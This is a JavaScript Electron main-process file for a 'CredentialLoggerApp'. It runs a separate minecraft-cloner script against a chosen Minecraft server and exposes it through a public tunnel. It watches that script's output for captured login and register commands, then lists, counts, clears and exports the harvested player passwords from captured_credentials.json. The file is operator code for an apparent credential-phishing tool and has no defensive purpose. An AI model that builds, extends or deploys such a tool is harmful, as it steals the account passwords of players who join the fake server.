// Kill process tree helper
const treeKill = require('./tree-kill-helper');
const { app, BrowserWindow, ipcMain, dialog, shell } = require('electron');
const path = require('path');
const fs = require('fs');
const { spawn } = require('child_process');

class CredentialLoggerApp {
    constructor() {
        this.mainWindow = null;
        this.clonerProcess = null;
        this.setupIPCHandlers();
    }

    createWindow() {
        this.mainWindow = new BrowserWindow({
            width: 1200,
            height: 800,
            minWidth: 900,
            minHeight: 600,
            icon: path.join(__dirname, 'assets/Logo.png'),
            webPreferences: {
                nodeIntegration: true,
                contextIsolation: false,
                enableRemoteModule: true
            },
            titleBarStyle: 'hidden',
            frame: false,
            show: false,
            backgroundColor: '#1a1a1a'
        });

        this.mainWindow.loadFile('renderer/index.html');

        // Show window when ready
        this.mainWindow.once('ready-to-show', () => {
            this.mainWindow.show();
        });

        // DevTools in dev mode
        if (process.argv.includes('--dev')) {
            this.mainWindow.webContents.openDevTools();
        }

        this.mainWindow.on('closed', () => {
            this.mainWindow = null;
            this.cleanup();
        });
    }

    setupIPCHandlers() {
        // Window controls
        ipcMain.handle('window-minimize', () => {
            this.mainWindow?.minimize();
        });

        ipcMain.handle('window-maximize', () => {
            if (this.mainWindow?.isMaximized()) {
                this.mainWindow.unmaximize();
            } else {
                this.mainWindow?.maximize();
            }
        });

        ipcMain.handle('window-close', () => {
            this.cleanup();
            app.quit();
        });

        // Cloner functions
        ipcMain.handle('start-cloner', async (event, serverHost, serverPort) => {
            return this.startCloner(serverHost, serverPort);
        });

        ipcMain.handle('stop-cloner', async () => {
            return this.stopCloner();
        });

        ipcMain.handle('get-credentials', async () => {
            return this.getCredentials();
        });

        ipcMain.handle('clear-credentials', async () => {
            return this.clearCredentials();
        });

        ipcMain.handle('export-credentials', async () => {
            return this.exportCredentials();
        });

        ipcMain.handle('get-server-info', async (event, serverHost, serverPort) => {
            return this.getServerInfo(serverHost, serverPort);
        });
    }


    async startCloner(serverHost, serverPort) {
        try {
            if (this.clonerProcess) {
                this.stopCloner();
            }

            // On Windows, use shell: true for better signal handling
            this.clonerProcess = spawn('node', ['minecraft-cloner.js', serverHost, serverPort], {
                cwd: __dirname,
                stdio: ['pipe', 'pipe', 'pipe'],
                detached: false,
                shell: process.platform === 'win32'
            });

            let output = '';
            let publicUrl = '';

            this.clonerProcess.stdout.on('data', (data) => {
                const text = data.toString();
                output += text;
                // ...existing code...
                this.mainWindow?.webContents.send('cloner-output', text);
                // ...existing code...
                const urlMatch = text.match(/📡 PUBLIC IP: (.+)/);
                if (urlMatch) {
                    publicUrl = urlMatch[1].trim();
                    this.mainWindow?.webContents.send('public-url', publicUrl);
                }
                const versionMatch = text.match(/Version: (.+)/);
                if (versionMatch) {
                    this.mainWindow?.webContents.send('server-info-update', {
                        version: versionMatch[1].trim()
                    });
                }
                const playersMatch = text.match(/Players: (.+)/);
                if (playersMatch) {
                    this.mainWindow?.webContents.send('server-info-update', {
                        players: playersMatch[1].trim()
                    });
                }
                if (text.includes('✅ Server detected successfully!')) {
                    this.mainWindow?.webContents.send('server-status', 'connected');
                }
                if (text.includes('🎉 PUBLIC TUNNEL ACTIVE!')) {
                    this.mainWindow?.webContents.send('tunnel-status', 'active');
                }
                if (text.includes('🔥 CREDENTIAL CAPTURED!') || 
                    text.includes('LOGIN COMMAND:') || 
                    text.includes('REGISTER COMMAND:') ||
                    text.includes('📝 COMMAND')) {
                    console.log('🔄 Credentials updated - notify renderer');
                    this.mainWindow?.webContents.send('credentials-updated');
                    setTimeout(() => {
                        this.mainWindow?.webContents.send('credentials-updated');
                    }, 1000);
                }
            });

            this.clonerProcess.stderr.on('data', (data) => {
                const error = data.toString();
                this.mainWindow?.webContents.send('cloner-error', error);
            });

            this.clonerProcess.on('close', (code) => {
                this.mainWindow?.webContents.send('cloner-stopped', code);
                this.clonerProcess = null;
            });

            return { success: true, message: 'Cloner started successfully' };

        } catch (error) {
            return { success: false, message: error.message };
        }
    }

    stopCloner() {
        if (this.clonerProcess) {
            if (this.clonerProcess.pid && this.clonerProcess.pid > 0) {
                treeKill(this.clonerProcess.pid, 'SIGKILL', (err) => {
                    if (err && err.code !== 'ESRCH') {
                        console.log('⚠️  Error killing cloner tree:', err.message);
                    } else {
                        console.log('🛑 Cloner process tree killed');
                    }
                });
            }
            this.clonerProcess = null;
        }
        this.isRunning = false;
        return { success: true, message: 'Cloner stopped' };
    }

    async getCredentials() {
        try {
            const credPath = path.join(__dirname, 'captured_credentials.json');
            if (fs.existsSync(credPath)) {
                const data = fs.readFileSync(credPath, 'utf8');
                const rawData = JSON.parse(data);
                
                const credentials = Array.isArray(rawData) ? rawData : rawData.credentials || [];
                
                // Filter only credentials with passwords
                const validCredentials = credentials.filter(cred => 
                    cred.password && (cred.type?.includes('login') || cred.type?.includes('register'))
                );
                
                const stats = {
                    total: validCredentials.length,
                    unique_users: [...new Set(validCredentials.map(c => c.nickname || c.username))].length,
                    connections: credentials.filter(c => c.type === 'connection').length
                };
                
                return { 
                    credentials: validCredentials.reverse(), // Show newest first
                    stats 
                };
            }
            return { credentials: [], stats: { total: 0, unique_users: 0, connections: 0 } };
        } catch (error) {
            return { credentials: [], stats: { total: 0, unique_users: 0, connections: 0 }, error: error.message };
        }
    }

    async clearCredentials() {
        try {
            const credPath = path.join(__dirname, 'captured_credentials.json');
            const emptyData = {
                credentials: [],
                stats: { total: 0, unique_users: 0, connections: 0 }
            };
            fs.writeFileSync(credPath, JSON.stringify(emptyData, null, 2));
            return { success: true, message: 'Credentials deleted' };
        } catch (error) {
            return { success: false, message: error.message };
        }
    }

    async exportCredentials() {
        try {
            const result = await dialog.showSaveDialog(this.mainWindow, {
                title: 'Export Credentials',
                defaultPath: 'credentials_export.json',
                filters: [
                    { name: 'JSON Files', extensions: ['json'] },
                    { name: 'Text Files', extensions: ['txt'] }
                ]
            });

            if (!result.canceled) {
                const credentials = await this.getCredentials();
                fs.writeFileSync(result.filePath, JSON.stringify(credentials, null, 2));
                return { success: true, message: 'Credentials exported' };
            }
            return { success: false, message: 'Export canceled' };
        } catch (error) {
            return { success: false, message: error.message };
        }
    }

    async getServerInfo(serverHost, serverPort) {
        return new Promise((resolve) => {
            const mc = require('minecraft-protocol');

            // Use minecraft-protocol directly instead of spawn
            mc.ping({
                host: serverHost,
                port: serverPort,
                version: '1.21.1'
            }).then(data => {
                resolve({
                    version: data.version,
                    players: data.players,
                    description: data.description,
                    favicon: data.favicon
                });
            }).catch(err => {
                resolve({ error: err.message });
            });
        });
    }

    cleanup() {
        if (this.clonerProcess) {
            this.clonerProcess.kill();
        }
    }
}

// App initialization
const credLoggerApp = new CredentialLoggerApp();

app.whenReady().then(() => {
    credLoggerApp.createWindow();
});

app.on('window-all-closed', () => {
    credLoggerApp.cleanup();
    if (process.platform !== 'darwin') {
        app.quit();
    }
});

app.on('activate', () => {
    if (BrowserWindow.getAllWindows().length === 0) {
        credLoggerApp.createWindow();
    }
});